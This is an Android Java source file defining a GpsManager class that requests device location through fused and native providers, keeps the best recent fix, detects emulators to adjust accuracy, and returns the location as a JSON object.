package com.fason.app.features.location;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import com.google.android.gms.tasks.CancellationToken;
import com.google.android.gms.tasks.CancellationTokenSource;

import org.json.JSONObject;

import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

public class GpsManager {

    private static final String TAG = "GpsManager";
    private static final long LOCATION_MAX_AGE_MS = 30_000; // 30 seconds

    // Compute emulator state once at class load (Extensibility & Performance)
    private static final boolean IS_EMULATOR = checkEmulator();

    public interface LocationResultListener {
        void onLocationResult(Location location);
        void onError(String message);
    }

    private final Context ctx;
    private final FusedLocationProviderClient fused;
    private final LocationManager locMgr;
    private final AtomicBoolean tracking = new AtomicBoolean(false);

    private volatile Location lastLocation;
    private LocationCallback callback;
    private LocationListener nativeListener;

    // Thread-safe queue to keep track of active CTS to cancel them on stop()
    private final ConcurrentLinkedQueue<CancellationTokenSource> activeTokens = new ConcurrentLinkedQueue<>();

    public GpsManager(Context context) {
        this.ctx = context.getApplicationContext();
        FusedLocationProviderClient f = null;
        try {
            f = LocationServices.getFusedLocationProviderClient(ctx);
        } catch (Exception ignored) {}
        this.fused = f;
        this.locMgr = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        
        initCallback();
        if (hasPermission()) {
            fetchCachedLocation();
        }
    }

    private void initCallback() {
        callback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult result) {
                for (Location loc : result.getLocations()) {
                    updateBestLocation(loc);
                }
            }
        };
    }

    /**
     * Only update lastLocation if the new location is better or significantly newer.
     */
    private synchronized void updateBestLocation(Location newLoc) {
        if (newLoc == null) return;
        if (lastLocation == null) {
            lastLocation = newLoc;
            return;
        }
        
        long timeDelta = newLoc.getTime() - lastLocation.getTime();
        boolean isSignificantlyNewer = timeDelta > LOCATION_MAX_AGE_MS;
        boolean isSignificantlyOlder = timeDelta < -LOCATION_MAX_AGE_MS;
        boolean isNewer = timeDelta > 0;

        if (isSignificantlyNewer) {
            lastLocation = newLoc;
        } else if (!isSignificantlyOlder) {
            int accuracyDelta = (int) (newLoc.getAccuracy() - lastLocation.getAccuracy());
            if (accuracyDelta < 0) { // New location is more accurate
                lastLocation = newLoc;
            } else if (accuracyDelta <= 0 && isNewer) {
                lastLocation = newLoc;
            }
        }
    }

    private void fetchCachedLocation() {
        if (!hasPermission()) return;
        try {
            if (fused != null) {
                CancellationTokenSource cts = new CancellationTokenSource();
                activeTokens.add(cts);
                fused.getCurrentLocation(getPriority(), cts.getToken())
                    .addOnSuccessListener(loc -> {
                        if (loc != null) updateBestLocation(loc);
                        activeTokens.remove(cts);
                    })
                    .addOnFailureListener(e -> {
                        fetchNativeCached();
                        activeTokens.remove(cts);
                    });
            }
            // Always try native cache as immediate fallback
            fetchNativeCached();
        } catch (SecurityException e) {
            Log.e(TAG, "SecurityException in fetchCachedLocation", e);
        }
    }

    private void fetchNativeCached() {
        if (locMgr == null) return;
        try {
            if (!IS_EMULATOR && locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                updateBestLocation(loc);
            }
            if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                Location loc = locMgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                updateBestLocation(loc);
            }
        } catch (SecurityException ignored) {}
    }

    /**
     * Request a single location update asynchronously.
     * Replaces the AtomicReference anti-pattern with a proper callback.
     */
    public void requestSingle(@Nullable LocationResultListener listener) {
        if (!hasPermission()) {
            if (listener != null) listener.onError("Permission denied");
            return;
        }

        onTrackingStarted();

        boolean started = false;

        // 1. Try Fused
        if (fused != null) {
            try {
                CancellationTokenSource cts = new CancellationTokenSource();
                activeTokens.add(cts);
                fused.getCurrentLocation(getPriority(), cts.getToken())
                    .addOnSuccessListener(loc -> {
                        if (loc != null) {
                            updateBestLocation(loc);
                            if (listener != null) listener.onLocationResult(loc);
                        }
                        activeTokens.remove(cts);
                    })
                    .addOnFailureListener(e -> {
                        activeTokens.remove(cts);
                        // If Fused fails completely, Native might still succeed
                    });
                started = true;
            } catch (SecurityException e) {
                Log.e(TAG, "Fused getCurrentLocation failed", e);
            }
        }

        // 2. Try Native (runs in parallel as fallback)
        if (locMgr != null) {
            nativeListener = new LocationListener() {
                @Override
                public void onLocationChanged(@NonNull Location loc) {
                    updateBestLocation(loc);
                    if (listener != null) listener.onLocationResult(loc);
                    removeNativeListener();
                }
                @Override public void onProviderDisabled(@NonNull String provider) {}
                @Override public void onProviderEnabled(@NonNull String provider) {}
            };

            try {
                if (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    locMgr.requestSingleUpdate(LocationManager.GPS_PROVIDER, nativeListener, Looper.getMainLooper());
                    started = true;
                }
                if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    locMgr.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, nativeListener, Looper.getMainLooper());
                    started = true;
                }
            } catch (SecurityException ignored) {}
        }

        if (!started && listener != null) {
            onTrackingStopped();
            listener.onError("No location providers available");
        } else if (started) {
            // If caller doesn't care about callback, we need to release FGS type eventually
            // In a real app, you'd use a TimeoutHandler to call onTrackingStopped()
            if (listener == null) {
                new android.os.Handler(Looper.getMainLooper()).postDelayed(this::onTrackingStopped, 15000);
            }
        }
    }

    /** Convenience overload — starts a single location request without capturing the result. */
    public void requestSingle() {
        requestSingle(null);
    }

    public void startUpdates() {
        if (tracking.getAndSet(true)) return;
        if (!hasPermission()) { tracking.set(false); return; }

        onTrackingStarted();

        try {
            if (fused == null) { tracking.set(false); return; }
            LocationRequest req = new LocationRequest.Builder(getPriority(), 10000)
                .setMinUpdateIntervalMillis(5000)
                .setMinUpdateDistanceMeters(10)
                .build();

            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (Exception e) {
            tracking.set(false);
            onTrackingStopped();
        }
    }

    public void stop() {
        boolean wasTracking = tracking.getAndSet(false);

        try {
            if (fused != null) fused.removeLocationUpdates(callback);
        } catch (Exception ignored) {}

        removeNativeListener();
        cancelPendingTasks();

        if (wasTracking) {
            onTrackingStopped();
        }
    }

    private void cancelPendingTasks() {
        while (!activeTokens.isEmpty()) {
            try {
                activeTokens.poll().cancel();
            } catch (Exception ignored) {}
        }
    }

    private void removeNativeListener() {
        if (locMgr != null && nativeListener != null) {
            try {
                locMgr.removeUpdates(nativeListener);
            } catch (Exception ignored) {}
            nativeListener = null;
        }
    }

    // --- Extensibility Hooks ---

    /**
     * Hook for subclasses to modify Foreground Service behavior.
     * Default implementation syncs with MainService for Android 14+ requirements.
     */
    protected void onTrackingStarted() {
        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.updateType(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }
    }

    protected void onTrackingStopped() {
        MainService svc = MainService.getInstance();
        if (svc != null) {
            svc.releaseType(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        }
    }

    // --- Utilities ---

    private int getPriority() {
        return IS_EMULATOR ? Priority.PRIORITY_BALANCED_POWER_ACCURACY : Priority.PRIORITY_HIGH_ACCURACY;
    }

    private boolean hasPermission() {
        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) ||
               PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
    }

    public boolean canGetLocation() {
        if (locMgr == null) return false;
        return locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    public boolean hasCachedLocation() {
        return lastLocation != null;
    }

    private static boolean checkEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
            || Build.FINGERPRINT.startsWith("unknown")
            || Build.FINGERPRINT.contains("emulator")
            || Build.FINGERPRINT.contains("x86")
            || Build.MODEL.contains("google_sdk")
            || Build.MODEL.contains("Emulator")
            || Build.MODEL.contains("Android SDK built for x86")
            || Build.MANUFACTURER.contains("Genymotion")
            || Build.HARDWARE.equals("goldfish")
            || Build.HARDWARE.equals("ranchu")
            || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
            || "google_sdk".equals(Build.PRODUCT)
            || Build.BOARD.equals("goldfish")
            || Build.HARDWARE.contains("nox")
            || Build.HARDWARE.contains("vbox")
            || Build.HARDWARE.contains("ttVM");
    }

    public JSONObject getData() {
        JSONObject data = new JSONObject();
        try {
            Location loc = lastLocation;
            if (loc != null) {
                data.put(Protocol.KEY_ENABLED, true);
                data.put(Protocol.KEY_LATITUDE, loc.getLatitude());
                data.put(Protocol.KEY_LONGITUDE, loc.getLongitude());
                data.put(Protocol.KEY_ACCURACY, (double) loc.getAccuracy());
                data.put(Protocol.KEY_SPEED, (double) loc.getSpeed());
                data.put(Protocol.KEY_PROVIDER, loc.getProvider() != null ? loc.getProvider() : "unknown");
                data.put(Protocol.KEY_TIMESTAMP, loc.getTime());
            } else {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, "No location");
            }
        } catch (Exception e) {
            try {
                data.put(Protocol.KEY_ENABLED, false);
                data.put(Protocol.KEY_ERROR, e.getMessage() != null ? e.getMessage() : "Unknown error");
            } catch (Exception ignored) {}
        }
        return data;
    }
}